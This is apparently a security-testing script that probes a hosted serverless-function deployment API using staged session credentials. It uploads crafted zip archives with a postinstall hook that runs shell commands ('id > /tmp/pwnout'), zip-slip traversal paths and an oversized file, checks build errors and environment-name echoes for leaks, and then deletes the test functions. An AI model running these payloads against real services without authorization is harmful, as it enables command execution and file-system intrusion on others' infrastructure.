# -*- coding: utf-8 -*-
"""deployment zip 处理矩阵 + env 行为:
1. env-only 部署(config-only,已有 fn)——验证 env names 回显(值不回显?)
2. zip 变体:postinstall 脚本 / zip slip / 超大 / 无 index——看 build error 泄露
3. 清理部署的测试函数"""
import http.client, ssl, json, re, html, os, sys, time, io, zipfile, uuid

ctx = ssl.create_default_context()
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST, cookie_str

ctxj = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_ctx.json')))
PID, BID = ctxj['pid'], ctxj['bid']

def ctl_req(method, path, body=None, ctype='application/json', raw_body=None):
    conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    conn.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r = conn.getresponse()
    r.read()
    fresh = {}
    for sc in r.headers.get_all('Set-Cookie') or []:
        m = re.match(r'([^=]+)=([^;]*)', sc)
        if m:
            fresh[m.group(1)] = m.group(2)
    conn.close()
    conn2 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    conn2.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r2 = conn2.getresponse()
    txt = r2.read().decode('utf-8', 'replace')
    conn2.close()
    m = re.search(r'<meta name="csrf-token" content="([^"]+)"', txt)
    csrf = html.unescape(m.group(1)) if m else None
    parts = []
    for c in cookie_str().split(';'):
        c = c.strip()
        if c.startswith('_gorilla_csrf=') and '_gorilla_csrf' in fresh:
            parts.append('_gorilla_csrf=' + fresh['_gorilla_csrf'])
        else:
            parts.append(c)
    conn3 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    hdrs = {'Cookie': '; '.join(parts), 'User-Agent': 'Mozilla/5.0'}
    hdrs.update(HEADERS_TEST)
    if ctype:
        hdrs['Content-Type'] = ctype
    if csrf:
        hdrs['X-CSRF-Token'] = csrf
    data = raw_body if raw_body is not None else (json.dumps(body).encode() if body is not None else None)
    conn3.request(method, path, body=data, headers=hdrs)
    r3 = conn3.getresponse()
    out = r3.read().decode('utf-8', 'ignore')
    conn3.close()
    return r3.status, out

def mp_post(slug, files=None, envs=None):
    boundary = '----b' + uuid.uuid4().hex
    parts = []
    for fname, fbytes in (files or {}).items():
        parts.append(('--' + boundary + '\r\nContent-Disposition: form-data; name="zip"; filename="%s"\r\nContent-Type: application/zip\r\n\r\n' % fname).encode() + fbytes + b'\r\n')
    if envs:
        parts.append(('--' + boundary + '\r\nContent-Disposition: form-data; name="environment"\r\n\r\n%s\r\n' % json.dumps(envs)).encode())
    parts.append(('--' + boundary + '\r\nContent-Disposition: form-data; name="runtime"\r\n\r\nnodejs24\r\n').encode())
    body = b''.join(parts) + ('--' + boundary + '--\r\n').encode()
    return ctl_req('POST', API_BASE + '/projects/%s/branches/%s/functions/%s/deployments' % (PID, BID, slug),
                   None, ctype='multipart/form-data; boundary=' + boundary, raw_body=body)

def mkzip(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        for name, data in entries.items():
            z.writestr(name, data)
    buf.seek(0)
    return buf.read()

GOOD = 'export default { fetch: (r) => new Response("ok") };'
FP = '/projects/%s/branches/%s/functions' % (PID, BID)

# 0) 新函数
s0 = 'secf2' + uuid.uuid4().hex[:8]
st, raw = mp_post(s0, files={'b.zip': mkzip({'index.js': GOOD})})
print('[0] base fn %s deploy -> %d %s' % (s0, st, raw[:250]), flush=True)

# 1) env-only config change(不带 zip)
st, raw = mp_post(s0, files={}, envs={'MY_SECRET_1': 'val1', 'MY_SECRET_2': ''})
print('[1] env-only deploy -> %d %s' % (st, raw[:300]), flush=True)
time.sleep(2)
st, raw = ctl_req('GET', API_BASE + FP + '/' + s0)
try:
    fn = json.loads(raw)['function']
    cd = fn.get('current_deployment', {})
    print('[1] status=%s env names=%s' % (cd.get('status'), json.dumps(cd.get('environment'))), flush=True)
except Exception as e:
    print('[1] get err %s %s' % (e, raw[:200]), flush=True)

# 2) postinstall 恶意脚本
s1 = 'secf3' + uuid.uuid4().hex[:8]
z = mkzip({'index.js': GOOD,
           'package.json': '{"name":"x","type":"module","main":"index.js","scripts":{"postinstall":"touch /tmp/pwn && id > /tmp/pwnout"}}'})
st, raw = mp_post(s1, files={'b.zip': z})
print('\n[2] postinstall fn -> %d %s' % (st, raw[:250]), flush=True)
time.sleep(3)
st, raw = ctl_req('GET', API_BASE + FP + '/' + s1)
try:
    fn = json.loads(raw)['function']
    cd = fn.get('current_deployment', {})
    print('[2] status=%s error=%s' % (cd.get('status'), (cd.get('error') or '')[:250]), flush=True)
except Exception as e:
    print('[2] err', e, raw[:200], flush=True)

# 3) zip slip 路径
s2 = 'secf4' + uuid.uuid4().hex[:8]
z = mkzip({'index.js': GOOD, '../evil.txt': 'x', 'sub/../../up.js': 'y'})
st, raw = mp_post(s2, files={'b.zip': z})
print('\n[3] zip-slip fn -> %d %s' % (st, raw[:250]), flush=True)
time.sleep(3)
st, raw = ctl_req('GET', API_BASE + FP + '/' + s2)
try:
    fn = json.loads(raw)['function']
    cd = fn.get('current_deployment', {})
    print('[3] status=%s error=%s' % (cd.get('status'), (cd.get('error') or '')[:250]), flush=True)
except Exception as e:
    print('[3] err', e, raw[:200], flush=True)

# 4) 超大 zip(20MB)
s3 = 'secf5' + uuid.uuid4().hex[:8]
big = 'x' * (20 * 1024 * 1024)
z = mkzip({'index.js': GOOD, 'big.bin': big})
st, raw = mp_post(s3, files={'b.zip': z})
print('\n[4] 20MB zip fn -> %d %s' % (st, raw[:200]), flush=True)

# 5) 无 index(只有 package.json / 空 handler)
s4 = 'secf6' + uuid.uuid4().hex[:8]
z = mkzip({'package.json': '{"name":"y","type":"module","main":"index.js"}'})
st, raw = mp_post(s4, files={'b.zip': z})
print('\n[5] no index fn -> %d %s' % (st, raw[:250]), flush=True)
time.sleep(3)
st, raw = ctl_req('GET', API_BASE + FP + '/' + s4)
try:
    fn = json.loads(raw)['function']
    cd = fn.get('current_deployment', {})
    print('[5] status=%s error=%s' % (cd.get('status'), (cd.get('error') or '')[:250]), flush=True)
except Exception as e:
    print('[5] err', e, raw[:200], flush=True)

# 清理 s0-s4
for s in [s0, s1, s2, s3, s4]:
    st, raw = ctl_req('DELETE', API_BASE + FP + '/' + s)
    print('cleanup %s -> %d' % (s, st), flush=True)
